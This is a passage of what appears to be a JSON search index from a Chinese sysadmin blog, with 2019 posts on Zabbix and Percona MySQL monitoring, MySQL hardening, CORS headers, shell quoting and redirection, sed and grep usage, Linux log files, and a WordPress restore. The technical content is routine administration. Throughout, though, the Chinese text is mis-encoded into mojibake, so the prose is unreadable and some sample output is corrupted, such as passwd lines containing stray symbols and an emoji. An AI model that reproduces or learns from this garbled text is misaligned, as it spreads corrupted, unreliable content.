é…ç½®æ–‡ä»¶ä»¥åŠæ¨¡æ¿ å¯¼å…¥æ¨¡æ¿ é…ç½®zabbixè‡ªå®šä¹‰ç›‘æ§é¡¹ï¼š å®‰è£…è‡ªå¸¦çš„æ¨¡æ¿å’Œzabbix4.0ä¸å…¼å®¹ï¼Œè¿™è¾¹å°±ä½¿ç”¨åˆ«äººä¿®æ”¹å¥½çš„æ¨¡æ¿äº†ï¼Œä¹Ÿå¯ä»¥å®‰è£…ä¸€ä¸ªzabbix2.0ç‰ˆæœ¬å¯¼å…¥åï¼Œå‡çº§åˆ°4.0ç‰ˆæœ¬ï¼Œåœ¨å¯¼å‡ºå°±å¯ä»¥ç”¨äº†ã€‚ æ¨¡æ¿ä¸‹è½½åœ°å€ï¼šhttps://pan.baidu.com/s/1P9vlJYU9ZEx6o3ktyBM7ng æå–ç ï¼šuho1 æŠŠzbx_percona_mysql_template.xmlæ¨¡æ¿å¯¼å…¥åˆ°zabbixä¸­ã€‚ åˆ°perconaæ¨¡æ¿ç›®å½•ä¸­æŠŠæ¨¡æ¿é…ç½®æ–‡ä»¶å¤åˆ¶åˆ°zabbix_agent.dç›®å½•ä¸­,å¹¶é‡å¯zabbix-agent cp userparameter_percona_mysql.conf /etc/zabbix/zabbix_agentd.d/ systemctl restart zabbix-agent ä¿®æ”¹perconaè„šæœ¬/var/lib/zabbix/percona/scripts/ss_get_mysql_stats.phpï¼Œä¿®æ”¹ä¸ºå¯¹åº”å†…å®¹ $mysql_user = â€˜zabbixâ€™; $mysql_pass = â€˜passwordâ€™; $mysql_port = 3306; $mysql_socket = â€˜/var/lib/mysql/mysql.sockâ€™; æµ‹è¯•è„šæœ¬æ˜¯å¦æ­£å¸¸ä½¿ç”¨ï¼Œæ­£å¸¸å–å€¼ï¼Œok /var/lib/zabbix/percona/scripts/get_mysql_stats_wrapper.sh kt æµ‹è¯•å®Œè®°å¾—åˆ é™¤ç”Ÿæˆçš„æ–‡ä»¶ï¼Œå› ä¸ºæ‰‹åŠ¨æ‰§è¡Œæ—¶rootç”¨æˆ·ï¼Œzabbixè®¿é—®æ–‡ä»¶æ²¡æœ‰æƒé™ï¼Œéœ€è¦è®©zabbixæ¥ç”Ÿæˆè¿™ä¸ªæ–‡ä»¶ rm -f /tmp/localhost-mysql_cacti_stats.txt ä¸»æœºé“¾æ¥æ¨¡æ¿ï¼š é“¾æ¥æ¨¡æ¿ï¼š é…ç½®==ã€‹ä¸»æœº==ã€‹zabbix server==ã€‹æ¨¡æ¿==ã€‹æ·»åŠ percona-mysqlæ¨¡æ¿ æ·»åŠ å®Œæˆåï¼Œåœ¨ä¸»æœºçš„åº”ç”¨é›†ä¸­å¯ä»¥çœ‹åˆ°MySQLï¼Œå¹¶æœ‰191ä¸ªç›‘æ§é¡¹ æŸ¥çœ‹æœ€æ–°æ•°æ®ï¼š æ£€æµ‹==ã€‹æœ€æ–°æ•°æ®==ã€‹è¿‡æ»¤å‡ºMySQLåº”ç”¨é›† mysqlä¸»ä»ç›‘æ§é¡¹ä¿®æ”¹ï¼š ç›‘æ§é¡¹ä¸­MySQL running slaveæ˜¾ç¤ºä¸æ”¯æŒ Value â€œERROR 1045 (28000): Access denied for user â€˜zabbixâ€™@â€™localhostâ€™ (using password: NO) 0â€ of type â€œstringâ€ is not suitable for value type â€œNumeric (unsigned)â€ æ‰‹åŠ¨æ‰§è¡Œä¸€ä¸‹è„šæœ¬ï¼š sh get_mysql_stats_wrapper.sh running-slave ERROR 1045 (28000): Access denied for user â€˜rootâ€™@â€™localhostâ€™ (using password: NO) 0 ç”¨æˆ·åå¯†ç é”™è¯¯çš„åŸå› ï¼Œä¿®æ”¹get_mysql_stats_wrapper.shè„šæœ¬ä¸­19è¡Œçš„å†…å®¹ï¼Œéœ€è¦æŒ‡å®šä¸€ä¸ªæ‹¥æœ‰SUPER,REPLICATION CLIENTæƒé™çš„ç”¨æˆ· RES=`HOME=~zabbix mysql -uroot -pxxx -e â€˜SHOW SLAVE STATUS\\Gâ€™â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ç•¥ æ­¤æ—¶ç›‘æ§é¡¹æ˜¾ç¤ºæ­£å¸¸ã€‚ ","date":"2019-06-02 00:38","objectID":"/post/382/:0:0","tags":["mysql","zabbix"],"title":"zabbixç›‘æ§ä¹‹åˆ©ç”¨percona-zabbixç›‘æ§mysqlæ•°æ®åº“","uri":"/post/382/"},{"categories":["ç³»ç»ŸæœåŠ¡","databases"],"content":"/usr/bin/mysql_secure_installation Enter current password for root (enter for none): #æç¤ºè¾“å…¥rootå¯†ç  Set root password? [Y/n] #æ˜¯å¦è®¾ç½®rootå¯†ç  New password: #è¾“å…¥å¯†ç  Re-enter new password: #å†è¾“å…¥ä¸€æ¬¡å¯†ç  Remove anonymous users? [Y/n] #åˆ é™¤åŒ¿åç”¨æˆ· Disallow root login remotely? [Y/n] #ç¦æ­¢rootè¿œç¨‹ç™»é™† Remove test database and access to it? [Y/n] #åˆ é™¤æµ‹è¯•åº“ Reload privilege tables now? [Y/n] #åˆ·æ–°æˆæƒè¡¨ ","date":"2019-06-01 20:23","objectID":"/post/380/:0:0","tags":["mysql"],"title":"mysql_secure_installationå®‰å…¨åˆå§‹åŒ–","uri":"/post/380/"},{"categories":["å…¶ä»–"],"content":"No â€˜Access-Control-Allow-Originâ€™ header is present on the requested resource. Origin â€˜xxxxxâ€™ is therefore not allowed access. ä¸åŒwebåº”ç”¨å¯å‚è€ƒå¦‚ä¸‹å†…å®¹ï¼š apache:https://enable-cors.org/server_apache.html nginx:https://enable-cors.org/server_nginx.html ä¿®æ”¹apacheé…ç½®æ–‡ä»¶ \u003cDirectory â€œxxxxâ€\u003eåœ¨æ­¤è¡Œä¸‹é¢æ·»åŠ å¦‚ä¸‹å†…å®¹ Header set Access-Control-Allow-Origin â€œ*â€ or Header set Access-Control-Allow-Origin â€œhttp://www.soulchild.cnâ€ ","date":"2019-06-01 20:21","objectID":"/post/377/:0:0","tags":[],"title":"è·¨åŸŸé—®é¢˜å¯¼è‡´èµ„æºä¸èƒ½è®¿é—®ï¼šNo 'Access-Control-Allow-Origin' header is present on the requested resource.","uri":"/post/377/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"æ ¼å¼ï¼š {è¦æ›¿æ¢çš„å­—ç¬¦ä¸²,æ›¿æ¢åçš„å­—ç¬¦ä¸²}ï¼šå·¦èŠ±æ‹¬å·è¦æ”¾åœ¨éœ€è¦æ›¿æ¢çš„å­—ç¬¦ä¸²å‰é¢ ä¾‹å¦‚ï¼š test.txtæ”¹ä¸ºceshi.txt mv {test,ceshi}.txt å°†1.txtbæ”¹ä¸º1.txt mv 1.txt{b,} å°†1.txtæ”¹ä¸º1.txtb mv 1.txt{,b} å°†1.txtæ”¹ä¸º123.txt mv {1,123}.txt å°†1.txtæ”¹ä¸ºtest.txt mv {1,test}.txt ","date":"2019-06-01 20:20","objectID":"/post/375/:0:0","tags":[],"title":"cpï¼Œmvç­‰èŠ±æ‹¬å·ç”¨æ³•","uri":"/post/375/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"set 1 2 3 ä¸åŠ å¼•å·â€”â€“æ¯ä¸ªå‚æ•°è§†ä¸ºç‹¬ç«‹å‚æ•° [root@m01 ~]# for i in $*;do echo $i ;done 1 2 3 [root@m01 ~]# for i in $@;do echo $i ;done 1 2 3 åŠ å¼•å·â€”â€“$æŠŠæ‰€æœ‰å‚æ•°å½“åšä¸€ä¸ªæ•´ä½“ï¼Œ $@å’Œä¸åŠ å¼•å·ä¸€æ · [root@m01 ~]# for i in â€œ$\";do echo $i ;done 1 2 3 [root@m01 ~]# for i in â€œ$@\";do echo $i ;done 1 2 3 ","date":"2019-06-01 20:17","objectID":"/post/371/:0:0","tags":[],"title":"shellä¸­$*å’Œ$@çš„åŒºåˆ«","uri":"/post/371/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"2\u003e:æ ‡å‡†é”™è¯¯ or 1\u003eï¼šæ ‡å‡†è¾“å‡º \u0026\u003eï¼šæ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯ 2\u003e\u00261: å°†æ ‡å‡†é”™è¯¯è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡º æ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°error.logï¼Œæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°/dev/null ll 2\u003e error.log \u003e /dev/null æ ‡å‡†é”™è¯¯å’Œæ ‡å‡†è¾“å‡ºéƒ½é‡å®šå‘åˆ°/dev/null ll \u003e /dev/null 2\u003e\u00261 or ll \u003e /dev/null 2\u003e /dev/null or ll \u0026\u003e /dev/null ","date":"2019-06-01 20:15","objectID":"/post/369/:0:0","tags":["shell"],"title":"é‡å®šå‘2\u003e,\u0026\u003e;,1\u003e,\u003e....æ ‡å‡†é”™è¯¯å’Œæ ‡å‡†è¾“å‡º","uri":"/post/369/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"å‘½ä»¤æ ¼å¼ï¼š sed [options] 'command' file(s) sed [options] â€˜è¦æ“ä½œçš„è¡Œ å†…ç½®å‘½ä»¤â€™Â file or sed [options] â€˜/æ­£åˆ™è¡¨è¾¾å¼/å†…ç½®å‘½ä»¤â€™Â file æ­£åˆ™ä¹Ÿå¯ä»¥ä¸ç”¨/ï¼Œç”¨#@~ç‰¹æ®Šç¬¦å·ä¹Ÿå¯ä»¥ é€‰é¡¹å‚æ•° -e å…è®¸å¤šé¡¹ç¼–è¾‘ -n å–æ¶ˆé»˜è®¤çš„è¾“å‡º -i ç›´æ¥ä¿®æ”¹å¯¹åº”æ–‡ä»¶ -r æ”¯æŒæ‰©å±•å…ƒå­—ç¬¦ å†…ç½®å‘½ä»¤å‚æ•° a åœ¨å½“å‰è¡Œåæ·»åŠ ä¸€è¡Œæˆ–å¤šè¡Œ c åœ¨å½“å‰è¡Œè¿›è¡Œæ›¿æ¢ä¿®æ”¹ d åœ¨å½“å‰è¡Œè¿›è¡Œåˆ é™¤æ“ä½œ i åœ¨å½“å‰è¡Œä¹‹å‰æ’å…¥æ–‡æœ¬ p æ‰“å°åŒ¹é…çš„è¡Œæˆ–æŒ‡å®šè¡Œ n è¯»å…¥ä¸‹ä¸€è¾“å…¥è¡Œï¼Œä»ä¸‹ä¸€æ¡å‘½ä»¤è¿›è¡Œå¤„ç† ! å¯¹æ‰€é€‰è¡Œä»¥å¤–çš„æ‰€æœ‰è¡Œåº”ç”¨å‘½ä»¤ wÂ å°†åŒ¹é…çš„å†…å®¹å†™å…¥åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶ä¸­ h æŠŠæ¨¡å¼ç©ºé—´é‡Œçš„å†…å®¹é‡å®šå‘åˆ°æš‚å­˜ç¼“å†²åŒº H æŠŠæ¨¡å¼ç©ºé—´é‡Œçš„å†…å®¹è¿½åŠ åˆ°æš‚å­˜ç¼“å†²åŒº g å–å‡ºæš‚å­˜ç¼“å†²åŒºçš„å†…å®¹ï¼Œå°†å…¶å¤åˆ¶åˆ°æ¨¡å¼ç©ºé—´ï¼Œè¦†ç›–è¯¥å¤„åŸæœ‰å†…å®¹ G å–å‡ºæš‚å­˜ç¼“å†²åŒºçš„å†…å®¹ï¼Œå°†å…¶å¤åˆ¶åˆ°æ¨¡å¼ç©ºé—´ï¼Œè¿½åŠ åœ¨åŸæœ‰å†…å®¹åé¢ s æ›¿æ¢å‘½ä»¤æ ‡å¿— g è¡Œå†…å…¨å±€æ›¿æ¢ i å¿½ç•¥æ›¿æ¢å¤§å°å†™ ä¸¾ä¾‹ï¼ˆåŠ -iæ‰ä¼šä¿®æ”¹æ–‡ä»¶ï¼‰ï¼š -eï¼šå…ˆåˆ é™¤1-9è¡Œ åœ¨è¿›è¡Œå†…å®¹æ›¿æ¢ sed -e â€˜1,9dâ€™ -e â€™s#root#admin#gâ€™ passwd pï¼špå’Œ-nä¸€èˆ¬ä¸€èµ·ä½¿ç”¨ æ‰“å°åŒ…å«haltçš„è¡Œ sed -nÂ â€˜/halt/pâ€™ passwd æ‰“å°ç¬¬äºŒè¡Œçš„å†…å®¹ sed -nÂ â€˜2pâ€™ passwd æ‰“å°æœ€åä¸€è¡Œçš„å†…å®¹ sed -nÂ â€˜$pâ€™ passwd aï¼šåœ¨å½“å‰è¡Œåæ·»åŠ ä¸€è¡Œæˆ–å¤šè¡Œ åœ¨ç¬¬3è¡Œçš„ä¸‹ä¸€è¡Œæ·»åŠ æŒ‡å®šå†…å®¹ sed â€˜3aÂ contentâ€™ test.conf cï¼šåœ¨å½“å‰è¡Œè¿›è¡Œæ›¿æ¢ä¿®æ”¹ ä¿®æ”¹ç¬¬ä¸ƒè¡Œçš„å†…å®¹ sed â€˜7cÂ SELINUX=Disabledâ€™ /etc/selinux/config ä¹Ÿå¯ä»¥ä½¿ç”¨æ­£åˆ™ï¼Œæ‰¾å‡ºä»¥SELINUX=å¼€å¤´çš„å†…å®¹çš„è¡Œï¼Œä¿®æ”¹ä¸ºæ‰§è¡Œå†…å®¹ sed â€˜/^SELINUX=/cÂ SELINUX=Disabledâ€™ /etc/selinux/config dï¼šåˆ é™¤è¡Œ åˆ é™¤ç¬¬äºŒè¡Œçš„å†…å®¹ sed â€˜2dâ€™ test.conf åˆ é™¤æœ€åä¸€è¡Œçš„å†…å®¹ sed â€˜$dâ€™ test.conf ä½¿ç”¨æ­£åˆ™åˆ é™¤åŒ…å«mailçš„è¡Œ sed /mail/dÂ test.conf iï¼šåœ¨å½“å‰è¡Œä¹‹å‰æ’å…¥æ–‡æœ¬ åœ¨ç¬¬ä¸‰è¡Œæ’å…¥çš„ä¸Šä¸€è¡Œæ·»åŠ æŒ‡å®šå†…å®¹ sed â€˜3i content;â€™ passwd wï¼šå°†åŒ¹é…çš„å†…å®¹å†™å…¥åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶ä¸­ å°†åŒ…å«rootçš„è¡Œï¼Œå†™å…¥æ–°çš„æ–‡ä»¶å½“ä¸­ sed -n â€˜/root/w newfileâ€™ passwd nï¼šå¯¹ä¸‹ä¸€è¡Œè¿›è¡Œæ“ä½œ åˆ é™¤åŒ…å«rootè¡Œçš„ä¸‹ä¸€è¡Œ sed â€˜/root/{n;d}â€™ passwd æ›¿æ¢rootè¡Œä¸‹ä¸€è¡Œçš„å†…å®¹ sed -n â€˜/root/{n;s#login#aaaaaaa#;p}â€™ passwd !ï¼šå¯¹æ‰€é€‰è¡Œä»¥å¤–çš„æ‰€æœ‰è¡Œåº”ç”¨å‘½ä»¤ åˆ é™¤é™¤äº†ç¬¬ä¸‰è¡Œçš„æ‰€æœ‰å†…å®¹ sed â€˜3!dâ€™ /etc/hosts sï¼šæ›¿æ¢å­—ç¬¦ä¸²ï¼Œiï¼šå¿½ç•¥å¤§å°å†™ï¼Œgï¼šè¡Œä¸­æ‰€æœ‰åŒ¹é…å†…å®¹éƒ½æ›¿æ¢ å°†æ‰€æœ‰rootä¿®æ”¹ä¸ºadminï¼Œå¿½ç•¥å¤§å°å†™ sed â€™s/root/admin/giâ€™ passwd \u0026ä»£è¡¨å‰é¢åŒ¹é…åˆ°çš„å†…å®¹ï¼Œä¸‹é¢å‘½ä»¤çš„ä½œç”¨å°±æ˜¯åœ¨nologinç»“å°¾çš„è¡Œåé¢æ·»åŠ test sed â€™s/nologin$/\u0026test/â€™ passwd åå‘å¼•ç”¨:åœ¨æ­£åˆ™éƒ¨åˆ†åŠ æ‹¬å·ï¼Œç¬¬ä¸€ä¸ªæ‹¬å·åŒ¹é…çš„å†…å®¹ä¸º\\1ï¼Œç¬¬äºŒä¸ªä¸º\\2Â ......ï¼Œ\u0026ä»£è¡¨æ­£åˆ™è¡¨è¾¾å¼æ•´ä½“åŒ¹é…çš„å†…å®¹ æŸ¥æ‰¾å‡ºeth1ç½‘å¡çš„ipåœ°å€ ip a s eth1 | sed -n 3p | sed â€™s#.et (.)/.*#\\1#â€™ æŒ‡å®šè¡Œæ‰¹é‡æ·»åŠ æ³¨é‡Šã€‚^åŒ¹é…çš„æ˜¯è¡Œé¦–ï¼Œæ›¿æ¢ä¸º#\u0026ï¼Œå³ä¸ºåœ¨è¡Œé¦–æ·»åŠ #å· sed â€˜2,5s/^/#\u0026/â€™ test.conf åŒ¹é…å†…å®¹æ·»åŠ æ³¨é‡Šï¼Œåœ¨rootæ‰€åœ¨è¡Œçš„è¡Œé¦–æ·»åŠ æ³¨é‡Š sed â€˜/root/s/^/#\u0026/â€™ test.conf ","date":"2019-06-01 20:12","objectID":"/post/365/:0:0","tags":[],"title":"sedå‘½ä»¤çš„ä½¿ç”¨","uri":"/post/365/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"1.sh ä¸éœ€è¦è„šæœ¬æ‰§è¡Œæƒé™ï¼Œçˆ¶shellä¸ä¼šç»§æ‰¿è„šæœ¬ï¼ˆå­shellï¼‰ä¸­çš„å˜é‡ 2.Â ./ éœ€è¦è„šæœ¬æ‹¥æœ‰æ‰§è¡Œæƒé™ï¼Œçˆ¶shellä¸ä¼šç»§æ‰¿è„šæœ¬ï¼ˆå­shellï¼‰ä¸­çš„å˜é‡ 3.sourceå’Œ.æ˜¯ä¸€æ ·çš„ çˆ¶shellç»§æ‰¿è„šæœ¬ï¼ˆå­shellï¼‰ä¸­çš„å˜é‡ ","date":"2019-06-01 20:12","objectID":"/post/363/:0:0","tags":["shell"],"title":"shellä¸­shã€sourceã€. ã€.æ ã€æ‰§è¡Œè„šæœ¬çš„åŒºåˆ«","uri":"/post/363/"},{"categories":["åŸºç¡€å†…å®¹","å¸¸ç”¨å‘½ä»¤"],"content":"æ­£åˆ™è¡¨è¾¾å¼ \\Â è½¬ä¹‰ç¬¦ï¼Œå°†ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œå¿½ç•¥å…¶ç‰¹æ®Šæ„ä¹‰ ^Â åŒ¹é…è¡Œé¦–ï¼Œawkä¸­ï¼Œ^åˆ™æ˜¯åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å§‹ $Â åŒ¹é…è¡Œå°¾ï¼Œawkä¸­ï¼Œ$åˆ™æ˜¯åŒ¹é…å­—ç¬¦ä¸²çš„ç»“å°¾ ^$Â è¡¨ç¤ºç©ºè¡Œ .Â åŒ¹é…é™¤æ¢è¡Œç¬¦\\nä¹‹å¤–çš„ä»»æ„å•ä¸ªå­—ç¬¦ [ ]Â åŒ¹é…åŒ…å«åœ¨[å­—ç¬¦]ä¹‹ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ [^ ]Â åŒ¹é…[^å­—ç¬¦]ä¹‹å¤–çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ [ - ]Â åŒ¹é…[]ä¸­æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼Œä¾‹ï¼š[1-9][a-z] ?Â åŒ¹é…ä¹‹å‰çš„é¡¹1æ¬¡æˆ–è€…0æ¬¡ +Â åŒ¹é…ä¹‹å‰çš„é¡¹1æ¬¡æˆ–è€…å¤šæ¬¡ *Â åŒ¹é…ä¹‹å‰çš„é¡¹0æ¬¡æˆ–è€…å¤šæ¬¡, .* ()Â åŒ¹é…è¡¨è¾¾å¼ï¼Œåˆ›å»ºä¸€ä¸ªç”¨äºåŒ¹é…çš„å­ä¸² { n }Â åŒ¹é…ä¹‹å‰çš„é¡¹næ¬¡ï¼Œnæ˜¯å¯ä»¥ä¸º0çš„æ­£æ•´æ•° {n,}Â ä¹‹å‰çš„é¡¹è‡³å°‘éœ€è¦åŒ¹é…næ¬¡ {n,m}Â æŒ‡å®šä¹‹å‰çš„é¡¹è‡³å°‘åŒ¹é…næ¬¡ï¼Œæœ€å¤šåŒ¹é…mæ¬¡ï¼Œn\u003c=m |Â æˆ–è€…ï¼Œ|ä¸¤è¾¹çš„ä»»æ„ä¸€é¡¹ï¼Œab(c|d)åŒ¹é…abcæˆ–abd ç‰¹å®šå­—ç¬¦: [[:space:]]Â ç©ºæ ¼ [[:digit:]]Â [0-9] [[:lower:]]Â [a-z] [[:upper:]]Â [A-Z] [[:alpha:]]Â [a-Z] grepå‚æ•°è¯´æ˜ï¼š -nï¼šæ˜¾ç¤ºè¡Œå· -vï¼šå–å -Eï¼šä½¿ç”¨æ‰©å±•æ­£åˆ™==egrep -iï¼šå¿½ç•¥å¤§å°å†™ -oï¼šåªè¾“å‡ºåŒ¹é…åˆ°çš„å†…å®¹ï¼ŒåŒ¹é…è¡Œä¸­çš„å…¶ä»–å†…å®¹ä¸è¾“å‡º -wï¼šæŒ‰ç…§å•è¯è¿‡æ»¤ -rï¼šéå†ç›®å½•æŸ¥æ‰¾ -A nï¼šè¾“å‡ºåŒ¹é…å†…å®¹çš„ånè¡Œ(åŒ…æ‹¬åŒ¹é…è¡Œ) -B nï¼šè¾“å‡ºåŒ¹é…å†…å®¹çš„å‰nè¡Œ(åŒ…æ‹¬åŒ¹é…è¡Œ) -C nï¼šè¾“å‡ºåŒ¹é…å†…å®¹çš„å‰ånè¡Œ(åŒ…æ‹¬åŒ¹é…è¡Œ) \u0026lt;ï¼šè¯é¦–é”šå®šï¼ŒåŒ\\b \u0026gt;ï¼šè¯å°¾é”šå®šï¼ŒåŒ\\b ä¸¾ä¾‹ï¼š #è¿‡æ»¤ä»¥må¼€å¤´çš„è¡Œ [root@m01 ~]# grep â€˜^mâ€™ passwd mailâŒ8:12:mail:/var/spool/mail:/sbin/nologin #è¿‡æ»¤ä»¥syncç»“å°¾çš„è¡Œ [root@m01 ~]# grep â€˜sync$â€™ passwd syncâŒ5:0:sync:/sbin:/bin/sync #è¿‡æ»¤ç©ºè¡Œï¼Œä¸æ˜¾ç¤ºç©ºè¡Œ [root@m01 ~]# grep -vÂ â€™^$â€™ passwd #æ˜¾ç¤ºåŒ¹é…å†…å®¹çš„å‰2è¡Œ [root@m01 ~]# grep -B2 â€˜^mâ€™ passwd shutdownâŒ6:0:shutdown:/sbin:/sbin/shutdown haltâŒ7:0:halt:/sbin:/sbin/halt mailâŒ8:12:mail:/var/spool/mail:/sbin/nologin #æ˜¾ç¤ºåŒ¹é…å†…å®¹çš„å2è¡Œ [root@m01 ~]# grep -A2 â€˜^mâ€™ passwd mailâŒ8:12:mail:/var/spool/mail:/sbin/nologin operatorâŒ11:0:operator:/root:/sbin/nologin gamesâŒ12ğŸ’¯games:/usr/games:/sbin/nologin #æ˜¾ç¤ºåŒ¹é…å†…å®¹çš„å‰å2è¡Œ [root@m01 ~]# grep -C2 â€˜^mâ€™ passwd shutdownâŒ6:0:shutdown:/sbin:/sbin/shutdown haltâŒ7:0:halt:/sbin:/sbin/halt mailâŒ8:12:mail:/var/spool/mail:/sbin/nologin operatorâŒ11:0:operator:/root:/sbin/nologin gamesâŒ12ğŸ’¯games:/usr/games:/sbin/nologin #è¿‡æ»¤nologinï¼Œåªæ˜¾ç¤ºåŒ¹é…çš„å†…å®¹ [root@m01 ~]# grep -o 'nologin' passwd nologin nologin ... #è¿‡æ»¤å‡ºseverçš„å•è¯ [root@m01 ~]# grep -w â€˜serverâ€™ /etc/ssh/sshd_config This is the sshdÂ serverÂ system-wide configuration file.Â See Subsystem sftp /usr/libexec/openssh/sftp-server ForceCommand cvsÂ server #éå†/rootç›®å½•ä¸­çš„æ–‡ä»¶ï¼ŒåŒ…å«helloçš„å†…å®¹ [root@m01 ~]# grep -r 'hello' /root/ /root/.bash_history:cowsay hello","date":"2019-06-01 20:11","objectID":"/post/360/:0:0","tags":[],"title":"grepç®€å•å¸¸ç”¨ç”¨æ³•","uri":"/post/360/"},{"categories":["å…¶ä»–"],"content":"http://tool.oschina.net/uploads/apidocs/jquery/regexp.html ","date":"2019-06-01 20:10","objectID":"/post/358/:0:0","tags":["æ­£åˆ™"],"title":"æ­£åˆ™è¡¨è¾¾å¼å…ƒå­—ç¬¦","uri":"/post/358/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"secureï¼šå®‰å…¨ç›¸å…³,ä¸»è¦æ˜¯ç”¨æˆ·è®¤è¯,å¦‚ç™»å½• ã€åˆ›å»ºå’Œåˆ é™¤è´¦å· ã€sudoç­‰ audit/audit.logï¼šå®¡è®¡æ—¥å¿—ã€‚è·Ÿç”¨æˆ·è´¦å·ç›¸å…³ messagesï¼šè®°å½•ç³»ç»Ÿå’Œè½¯ä»¶çš„ç»å¤§å¤šæ•°æ¶ˆæ¯ã€‚å¦‚æœåŠ¡å¯åŠ¨ ã€åœæ­¢ ã€æœåŠ¡é”™è¯¯ç­‰ã€‚ boot.logï¼šç³»ç»Ÿå¯åŠ¨æ—¥å¿—ã€‚èƒ½çœ‹åˆ°å¯åŠ¨æµç¨‹ã€‚ cronï¼šè®¡åˆ’ä»»åŠ¡æ—¥å¿—ã€‚ä¼šè®°å½•crontabè®¡åˆ’ä»»åŠ¡çš„åˆ›å»ºã€æ‰§è¡Œä¿¡æ¯ã€‚ dmesgï¼šç¡¬ä»¶è®¾å¤‡ä¿¡æ¯(device)ã€‚çº¯æ–‡æœ¬,ä¹Ÿå¯ä»¥ç”¨dmesgå‘½ä»¤æŸ¥çœ‹ã€‚ yum.logï¼šyumè½¯ä»¶çš„æ—¥å¿—ã€‚è®°å½•yumå®‰è£…ã€å¸è½½è½¯ä»¶çš„è®°å½•ã€‚ lastlogï¼šæœ€åç™»å½•çš„æ—¥å¿—ã€‚ç”¨lastlogæŸ¥çœ‹(äºŒè¿›åˆ¶æ—¥å¿—æ–‡ä»¶) btmpï¼šç™»å½•å¤±è´¥çš„ä¿¡æ¯(bad)ã€‚ç”¨lastbæŸ¥(äºŒè¿›åˆ¶æ—¥å¿—æ–‡ä»¶) wtmpï¼šæ­£ç¡®ç™»å½•çš„æ‰€æœ‰ç”¨æˆ·å‘½ä»¤(whoã€w)ï¼Œç”¨lastæŸ¥(äºŒè¿›åˆ¶æ—¥å¿—æ–‡ä»¶) ","date":"2019-06-01 20:09","objectID":"/post/356/:0:0","tags":["log"],"title":"linuxç³»ç»Ÿæ—¥å¿—æ–‡ä»¶","uri":"/post/356/"},{"categories":["å…¶ä»–"],"content":"ä»¥å‰æ²¡äº‹å¼„äº†ä¸€ä¸ªé˜¿é‡Œäº‘è™šæ‹Ÿä¸»æœºç©ï¼Œæ­äº†ä¸ªwordpressï¼Œåæ¥è™šæ‹Ÿä¸»æœºåˆ°æœŸï¼Œå¾ˆé•¿æ—¶é—´ä¹Ÿä¸ç®¡ï¼Œæœ€è¿‘çªç„¶åˆæƒ³ç”¨åšå®¢è®°å½•ä¸œè¥¿ï¼Œæƒ³ç€æŠŠä»¥å‰çš„ä¸œè¥¿åœ¨æ‹¿å‡ºæ¥ç»§ç»­ç”¨ï¼Œå¹¸å¥½æ•°æ®åº“å’Œç½‘ç«™å¤‡ä»½äº†ã€‚ å¼€å§‹æ¢å¤ï¼š 1.é¦–å…ˆæ­å»ºå¥½lampç¯å¢ƒ 2.ä¸Šä¼ æ•°æ®åº“å’Œç½‘ç«™ç¨‹åº å°†ç½‘ç«™ç¨‹åºæ”¾åˆ°webæ ¹ç›®å½• mv htdocs-2017-6-13/* /var/www/html/ å¯¼å…¥çš„æ—¶å€™éœ€è¦æ³¨æ„wpçš„ç¼–ç å’Œmysqlçš„ä¸€è‡´æ€§ [root@bogon ~]# mysql -uroot -p wordpress \u003c 22607_all.sql å¯ä»¥æŸ¥çœ‹wp-config.phpæ–‡ä»¶ä¸­çš„ç¼–ç  grep DB_CHARSET ./wp-config.php define(â€˜DB_CHARSETâ€™, â€˜utf8â€™); [root@bogon html]# mysql -uroot -p -e â€œ\\sâ€ | grep char Enter password: Server characterset:utf8 DbÂ characterset:utf8 Client characterset:utf8 Conn.Â characterset:utf8 3.ä¿®æ”¹wp-config.phpæ–‡ä»¶ä¸­æ•°æ®åº“è¿æ¥ä¿¡æ¯ 4.æ­¤æ—¶æ‰“å¼€å‘ç°é¦–é¡µæ­£å¸¸è®¿é—®ï¼Œä½†æ˜¯å†…é¡µ404ï¼Œåå°ç©ºç™½ 404å¯ä»¥ç†è§£ä¹‹å‰è®¾ç½®çš„ä¼ªé™æ€ï¼Œä½†æ˜¯åå°ç©ºç™½ä¸çŸ¥é“æ€ä¹ˆå›äº‹ï¼Œç™¾åº¦äº†ä¸€ä¸‹è¯´æ˜¯æ’ä»¶çš„é—®é¢˜ï¼ŒæŠŠæ’ä»¶ç›®å½•ä¸´æ—¶æ”¹åå°±å¯ä»¥äº† mv wp-content/plugins wp-content/pluginsbak æ­¤æ—¶æ‰“å¼€åå°æ­£å¸¸è®¿é—®ï¼Œä½†æ˜¯ã€‚ã€‚ã€‚å¯†ç å¿˜äº† å…ˆå»æŸ¥ä¸‹ç”¨æˆ·å select user_login from wp_users; ç„¶åä¿®æ”¹å¯†ç  update wp_users set user_pass=md5(â€œå¯†ç â€) where user_login=â€˜ç”¨æˆ·åâ€™; 5.æˆåŠŸç™»é™†åå°ï¼Œå°†pluginsç›®å½•æ”¹å›æ¥ mv wp-content/pluginsbak wp-content/plugins å°†å›ºå®šé“¾æ¥æ”¹ä¸ºæœ´ç´ è§£å†³å†…é¡µ404é—®é¢˜ï¼Œæˆ–ä¿®æ”¹ä¼ªé™æ€è§„åˆ™ ","date":"2019-06-01 